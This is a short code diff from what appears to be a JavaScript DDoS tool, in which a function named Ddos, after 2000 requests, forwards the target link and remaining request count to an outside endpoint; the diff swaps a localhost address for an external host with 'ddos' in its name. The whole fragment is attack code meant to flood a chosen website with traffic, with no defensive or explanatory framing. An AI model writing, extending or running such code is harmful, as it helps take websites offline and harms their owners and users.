@@ -14,7 +14,7 @@ function Ddos(link, max) {
     if (count >= 2000) {
       max = max - 2000;
       axios
-        .get(`http://localhost:6666/api/ddos?link=${link}&max=${max}`)
+        .get(`http://apiddos2.vidieu.net/api/ddos?link=${link}&max=${max}`)
         .catch(() => {});
       clearInterval(inter);
     }
